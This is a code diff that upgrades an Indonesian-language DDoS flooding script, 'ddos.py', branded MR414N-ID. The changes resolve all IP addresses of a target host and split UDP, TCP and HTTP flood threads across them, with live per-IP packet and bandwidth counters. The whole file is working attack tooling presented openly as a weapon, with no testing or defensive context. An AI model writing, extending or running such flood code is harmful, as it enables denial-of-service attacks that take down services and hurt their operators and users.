@@ -1,5 +1,5 @@
 # lang: Python 3.11+, file: ddos.py
-# build: pip install colorama
+# build: pip install colorama dnspython
 # usage: python ddos.py
 # stop: Ctrl+C
 
@@ -10,6 +10,11 @@ import time
 import sys
 import os
 from concurrent.futures import ThreadPoolExecutor
+try:
+    import dns.resolver
+    DNS_LIB = True
+except ImportError:
+    DNS_LIB = False
 from colorama import Fore, Style, init
 
 init(autoreset=True)
@@ -58,7 +63,7 @@ def tampil_bebek():
         time.sleep(0.03)
     print()
 
-# ---- BANNER MR414N-ID ----
+# ---- BANNER ----
 
 def tampil_banner():
     baris = [
@@ -74,8 +79,6 @@ def tampil_banner():
         print(rainbow(line))
         time.sleep(0.06)
     print()
-
-# ---- BANNER DDoS ----
 
 def tampil_ddos():
     ddos_baris = [
@@ -93,7 +96,7 @@ def tampil_ddos():
 
 # ---- LOADING ----
 
-def loading_bar(teks, durasi=1.5):
+def loading_bar(teks, durasi=1.2):
     bar_len = 40
     start = time.time()
     while True:
@@ -112,7 +115,7 @@ def loading_bar(teks, durasi=1.5):
         time.sleep(0.02)
     print()
 
-def spinner(teks, durasi=1.2):
+def spinner(teks, durasi=1.0):
     chars = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]
     end = time.time() + durasi
     i = 0
@@ -126,19 +129,45 @@ def spinner(teks, durasi=1.2):
         i += 1
     print()
 
-# ---- RESOLVE ----
+# ---- RESOLVE SEMUA IP ----
 
-def resolve_target(host):
+def resolve_semua_ip(host):
+    ips = set()
+
+    # method 1: dnspython — paling lengkap
+    if DNS_LIB:
+        try:
+            hasil = dns.resolver.resolve(host, 'A')
+            for r in hasil:
+                ips.add(r.address)
+        except Exception:
+            pass
+
+    # method 2: getaddrinfo — fallback
     try:
-        return socket.gethostbyname(host)
+        hasil = socket.getaddrinfo(host, None)
+        for r in hasil:
+            ip = r[4][0]
+            if ':' not in ip:  # skip IPv6
+                ips.add(ip)
     except Exception:
-        return None
+        pass
+
+    # method 3: gethostbyname_ex — kadang balik lebih dari 1
+    try:
+        _, _, addr_list = socket.gethostbyname_ex(host)
+        for ip in addr_list:
+            ips.add(ip)
+    except Exception:
+        pass
+
+    return list(ips)
 
 # ---- INPUT ----
 
 def input_interaktif():
     print(Fore.WHITE + Style.BRIGHT + "═" * 65)
-    print(Fore.RED   + Style.BRIGHT + "  ⚡ MR414N-ID DDoS BRUTAL TOOL — INFINITE MODE ⚡")
+    print(Fore.RED   + Style.BRIGHT + "  ⚡ MR414N-ID DDoS BRUTAL — AUTO MULTI-IP ⚡")
     print(Fore.WHITE + Style.BRIGHT + "═" * 65)
     print()
 
@@ -151,13 +180,22 @@ def input_interaktif():
             print(Fore.RED + "  [!] Target tidak boleh kosong.")
             continue
         host = raw.replace("https://","").replace("http://","").split("/")[0]
-        spinner(f"Resolving {host}...", 1.0)
-        ip = resolve_target(host)
-        if not ip:
+
+        spinner(f"Resolving semua IP dari {host}...", 1.5)
+        ips = resolve_semua_ip(host)
+
+        if not ips:
             print(Fore.RED + f"  [!] Gagal resolve {host}. Coba lagi.")
             continue
-        if ip != host:
-            print(Fore.GREEN + f"  [✓] {host} → {Fore.RED}{Style.BRIGHT}{ip}")
+
+        # tampil semua IP yang ketemu
+        print()
+        print(Fore.WHITE + Style.BRIGHT + "═" * 65)
+        print(Fore.GREEN + Style.BRIGHT + f"  [✓] Ditemukan {len(ips)} IP:")
+        for idx, ip in enumerate(ips, 1):
+            print(f"{Fore.CYAN}      [{idx}] {Fore.RED}{Style.BRIGHT}{ip}")
+        print(Fore.WHITE + Style.BRIGHT + "═" * 65)
+        print()
         break
 
     port_raw = input(
@@ -190,31 +228,38 @@ def input_interaktif():
     print(Style.RESET_ALL, end="")
     ukuran = int(ukuran_raw) if ukuran_raw.isdigit() else 65000
 
-    return ip, host, port, mode, threads, ukuran
+    return host, ips, port, mode, threads, ukuran
 
 # ---- TAMPIL INFO ----
 
-def tampil_info(host, ip, port, mode, threads, ukuran):
+def tampil_info(host, ips, port, mode, threads, ukuran):
+    per_ip = threads // len(ips)
     print()
     print(Fore.WHITE + Style.BRIGHT + "═" * 65)
-    print(Fore.RED   + Style.BRIGHT + "  💀 SERANGAN DIMULAI — BERJALAN SAMPAI CTRL+C 💀")
+    print(Fore.RED   + Style.BRIGHT + "  💀 SERANGAN MULTI-IP DIMULAI — CTRL+C UNTUK STOP 💀")
     print(Fore.WHITE + Style.BRIGHT + "═" * 65)
     print(f"{Fore.YELLOW}  [»] HOST        : {Fore.RED}{Style.BRIGHT}{host}")
-    print(f"{Fore.YELLOW}  [»] IP TARGET   : {Fore.RED}{Style.BRIGHT}{ip}")
+    for idx, ip in enumerate(ips, 1):
+        print(f"{Fore.YELLOW}  [»] IP [{idx}]      : {Fore.RED}{Style.BRIGHT}{ip}")
     print(f"{Fore.YELLOW}  [»] PORT        : {Fore.RED}{Style.BRIGHT}{port}")
     print(f"{Fore.YELLOW}  [»] MODE        : {Fore.RED}{Style.BRIGHT}{mode.upper()}")
-    print(f"{Fore.YELLOW}  [»] THREADS     : {Fore.RED}{Style.BRIGHT}{threads}")
+    print(f"{Fore.YELLOW}  [»] TOTAL THREAD: {Fore.RED}{Style.BRIGHT}{threads}")
+    print(f"{Fore.YELLOW}  [»] THREAD/IP   : {Fore.RED}{Style.BRIGHT}{per_ip}")
     print(f"{Fore.YELLOW}  [»] PAYLOAD     : {Fore.RED}{Style.BRIGHT}{ukuran} bytes")
-    print(f"{Fore.YELLOW}  [»] DELAY       : {Fore.RED}{Style.BRIGHT}0.01s per paket")
+    print(f"{Fore.YELLOW}  [»] DELAY       : {Fore.RED}{Style.BRIGHT}0.01s")
     print(f"{Fore.YELLOW}  [»] STOP        : {Fore.GREEN}{Style.BRIGHT}Ctrl+C")
-    print(f"{Fore.YELLOW}  [»] STATUS      : {Fore.GREEN}{Style.BRIGHT}⚡ RUNNING INFINITE ⚡")
+    print(f"{Fore.YELLOW}  [»] STATUS      : {Fore.GREEN}{Style.BRIGHT}⚡ ALL IP DISERANG SEKALIGUS ⚡")
     print(Fore.WHITE + Style.BRIGHT + "═" * 65)
     print()
 
-# ---- STATS ----
+# ---- STATS PER IP ----
 
-stats = {"kirim": 0, "error": 0, "bytes": 0}
-lock  = threading.Lock()
+stats_per_ip = {}
+lock = threading.Lock()
+
+def init_stats(ips):
+    for ip in ips:
+        stats_per_ip[ip] = {"kirim": 0, "error": 0, "bytes": 0}
 
 # ---- FLOOD FUNCTIONS ----
 
@@ -227,11 +272,11 @@ def udp_flood(ip, port, ukuran):
         try:
             sock.sendto(random.randbytes(ukuran), tujuan)
             with lock:
-                stats["kirim"] += 1
-                stats["bytes"] += ukuran
+                stats_per_ip[ip]["kirim"] += 1
+                stats_per_ip[ip]["bytes"] += ukuran
         except Exception:
             with lock:
-                stats["error"] += 1
+                stats_per_ip[ip]["error"] += 1
         time.sleep(0.01)
     sock.close()
 
@@ -245,11 +290,11 @@ def tcp_flood(ip, port, ukuran):
             s.sendall(random.randbytes(ukuran))
             s.close()
             with lock:
-                stats["kirim"] += 1
-                stats["bytes"] += ukuran
+                stats_per_ip[ip]["kirim"] += 1
+                stats_per_ip[ip]["bytes"] += ukuran
         except Exception:
             with lock:
-                stats["error"] += 1
+                stats_per_ip[ip]["error"] += 1
         time.sleep(0.01)
 
 def http_flood(ip, port, ukuran):
@@ -296,52 +341,70 @@ def http_flood(ip, port, ukuran):
             s.sendall(req)
             s.close()
             with lock:
-                stats["kirim"] += 1
-                stats["bytes"] += len(req)
+                stats_per_ip[ip]["kirim"] += 1
+                stats_per_ip[ip]["bytes"] += len(req)
         except Exception:
             with lock:
-                stats["error"] += 1
+                stats_per_ip[ip]["error"] += 1
         time.sleep(0.01)
 
-# ---- STATISTIK LIVE ----
+# ---- STATISTIK LIVE MULTI-IP ----
 
-def cetak_statistik(ip, port, mode):
+def cetak_statistik(ips, port, mode):
     global RUNNING
     bar_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.MAGENTA]
+    skulls = ["💀","👾","⚡","🔥","💥"]
     tick  = 0
     start = time.time()
+
     while RUNNING:
         with lock:
-            k = stats["kirim"]
-            e = stats["error"]
-            b = stats["bytes"]
-        elapsed = max(0.1, time.time() - start)
-        pps  = k / elapsed
-        mbps = (b * 8) / (elapsed * 1_000_000)
-        bc   = bar_colors[tick % len(bar_colors)]
+            snapshot = {ip: dict(stats_per_ip[ip]) for ip in ips}
 
-        # spinning skull
-        skulls = ["💀","👾","⚡","🔥","💥"]
+        elapsed = max(0.1, time.time() - start)
+        bc = bar_colors[tick % len(bar_colors)]
         sk = skulls[tick % len(skulls)]
 
-        sys.stdout.write(
-            f"\r{bc}{Style.BRIGHT}{sk} "
-            f"{Fore.YELLOW}TARGET:{Fore.RED}{Style.BRIGHT}{ip}:{port} "
-            f"{Fore.WHITE}│ "
-            f"{Fore.CYAN}MODE:{Fore.RED}{Style.BRIGHT}{mode.upper()} "
-            f"{Fore.WHITE}│ "
-            f"{Fore.GREEN}KIRIM:{Fore.WHITE}{Style.BRIGHT}{k:,} "
-            f"{Fore.WHITE}│ "
-            f"{Fore.MAGENTA}PPS:{Fore.WHITE}{Style.BRIGHT}{pps:,.0f} "
-            f"{Fore.WHITE}│ "
-            f"{Fore.BLUE}Mbps:{Fore.WHITE}{Style.BRIGHT}{mbps:.2f} "
-            f"{Fore.WHITE}│ "
-            f"{Fore.RED}ERR:{Fore.WHITE}{Style.BRIGHT}{e:,} "
-            f"{Fore.WHITE}│ "
-            f"{Fore.YELLOW}WAKTU:{Fore.WHITE}{Style.BRIGHT}{elapsed:.0f}s"
-            f"{Style.RESET_ALL}    "
+        # hitung total
+        total_kirim = sum(s["kirim"] for s in snapshot.values())
+        total_error = sum(s["error"] for s in snapshot.values())
+        total_bytes = sum(s["bytes"] for s in snapshot.values())
+        total_pps   = total_kirim / elapsed
+        total_mbps  = (total_bytes * 8) / (elapsed * 1_000_000)
+
+        # clear beberapa baris — 1 baris per IP + 2 baris header
+        lines = len(ips) + 2
+        sys.stdout.write(f"\033[{lines}A\033[J")
+
+        # header total
+        print(
+            f"{bc}{Style.BRIGHT}{sk} TOTAL "
+            f"{Fore.WHITE}│ {Fore.GREEN}KIRIM:{Fore.WHITE}{Style.BRIGHT}{total_kirim:,} "
+            f"{Fore.WHITE}│ {Fore.MAGENTA}PPS:{Fore.WHITE}{Style.BRIGHT}{total_pps:,.0f} "
+            f"{Fore.WHITE}│ {Fore.BLUE}Mbps:{Fore.WHITE}{Style.BRIGHT}{total_mbps:.2f} "
+            f"{Fore.WHITE}│ {Fore.RED}ERR:{Fore.WHITE}{Style.BRIGHT}{total_error:,} "
+            f"{Fore.WHITE}│ {Fore.YELLOW}WAKTU:{Fore.WHITE}{Style.BRIGHT}{elapsed:.0f}s"
+            f"{Style.RESET_ALL}"
         )
-        sys.stdout.flush()
+        print(Fore.WHITE + Style.BRIGHT + "─" * 65 + Style.RESET_ALL)
+
+        # per IP
+        for ip in ips:
+            s    = snapshot[ip]
+            pps  = s["kirim"] / elapsed
+            mbps = (s["bytes"] * 8) / (elapsed * 1_000_000)
+            print(
+                f"  {Fore.RED}{Style.BRIGHT}{ip:<18}{Style.RESET_ALL} "
+                f"{Fore.CYAN}│{Style.RESET_ALL} "
+                f"{Fore.GREEN}KIRIM:{Fore.WHITE}{Style.BRIGHT}{s['kirim']:>8,}{Style.RESET_ALL} "
+                f"{Fore.CYAN}│{Style.RESET_ALL} "
+                f"{Fore.MAGENTA}PPS:{Fore.WHITE}{Style.BRIGHT}{pps:>8,.0f}{Style.RESET_ALL} "
+                f"{Fore.CYAN}│{Style.RESET_ALL} "
+                f"{Fore.BLUE}Mbps:{Fore.WHITE}{Style.BRIGHT}{mbps:>6.2f}{Style.RESET_ALL} "
+                f"{Fore.CYAN}│{Style.RESET_ALL} "
+                f"{Fore.RED}ERR:{Fore.WHITE}{Style.BRIGHT}{s['error']:>6,}{Style.RESET_ALL}"
+            )
+
         tick += 1
         time.sleep(0.25)
 
@@ -356,23 +419,34 @@ if __name__ == "__main__":
 
     loading_bar("Memuat sistem senjata...", 1.2)
     loading_bar("Menyiapkan payload brutal...", 1.0)
-    spinner("Mengaktifkan mode infinite...", 0.8)
+    spinner("Mengaktifkan mode multi-target...", 0.8)
 
     print()
-    ip, host, port, mode, threads, ukuran = input_interaktif()
+    host, ips, port, mode, threads, ukuran = input_interaktif()
 
-    loading_bar("Mengunci target...", 1.2)
-    spinner("Membuka jalur serangan...", 0.8)
+    loading_bar("Mengunci semua target...", 1.2)
+    spinner("Membuka semua jalur serangan...", 0.8)
 
-    tampil_info(host, ip, port, mode, threads, ukuran)
+    tampil_info(host, ips, port, mode, threads, ukuran)
+
+    # init stats per IP
+    init_stats(ips)
+
+    # print placeholder baris statistik
+    lines = len(ips) + 2
+    for _ in range(lines):
+        print()
 
     # stat thread
     stat_thread = threading.Thread(
         target=cetak_statistik,
-        args=(ip, port, mode),
+        args=(ips, port, mode),
         daemon=True
     )
     stat_thread.start()
+
+    # hitung thread per IP
+    per_ip = max(1, threads // len(ips))
 
     flood_map = {
         "udp":  udp_flood,
@@ -381,36 +455,37 @@ if __name__ == "__main__":
     }
 
     try:
-        if mode == "mix":
-            per_mode = threads // 3
-            all_funcs = [udp_flood, tcp_flood, http_flood]
-            with ThreadPoolExecutor(max_workers=threads) as pool:
-                futures = []
-                for fn in all_funcs:
-                    for _ in range(per_mode):
+        with ThreadPoolExecutor(max_workers=threads + 10) as pool:
+            futures = []
+            for ip in ips:
+                if mode == "mix":
+                    per_mode = max(1, per_ip // 3)
+                    for fn in [udp_flood, tcp_flood, http_flood]:
+                        for _ in range(per_mode):
+                            futures.append(pool.submit(fn, ip, port, ukuran))
+                else:
+                    fn = flood_map[mode]
+                    for _ in range(per_ip):
                         futures.append(pool.submit(fn, ip, port, ukuran))
-                for f in futures:
-                    try:
-                        f.result()
-                    except Exception:
-                        pass
-        else:
-            fn = flood_map[mode]
-            with ThreadPoolExecutor(max_workers=threads) as pool:
-                futures = [pool.submit(fn, ip, port, ukuran) for _ in range(threads)]
-                for f in futures:
-                    try:
-                        f.result()
-                    except Exception:
-                        pass
+            for f in futures:
+                try:
+                    f.result()
+                except Exception:
+                    pass
 
     except KeyboardInterrupt:
         RUNNING = False
         time.sleep(0.5)
         print(f"\n\n{Fore.RED}{Style.BRIGHT}{'═'*65}")
-        print(f"  [✋] DIHENTIKAN OLEH USER")
-        print(f"  [»] Total Kirim : {stats['kirim']:,} paket")
-        print(f"  [»] Total Error : {stats['error']:,}")
-        print(f"  [»] Total Data  : {stats['bytes']/1_000_000:.2f} MB")
+        print(f"  [✋] DIHENTIKAN")
+        total_k = sum(s["kirim"] for s in stats_per_ip.values())
+        total_e = sum(s["error"] for s in stats_per_ip.values())
+        total_b = sum(s["bytes"] for s in stats_per_ip.values())
+        for ip in ips:
+            s = stats_per_ip[ip]
+            print(f"  [{ip}] kirim: {s['kirim']:,} | error: {s['error']:,}")
+        print(f"  [»] TOTAL KIRIM : {total_k:,}")
+        print(f"  [»] TOTAL ERROR : {total_e:,}")
+        print(f"  [»] TOTAL DATA  : {total_b/1_000_000:.2f} MB")
         print(f"{'═'*65}{Style.RESET_ALL}")
-        sys.exit(0)
+        import sys; sys.exit(0)
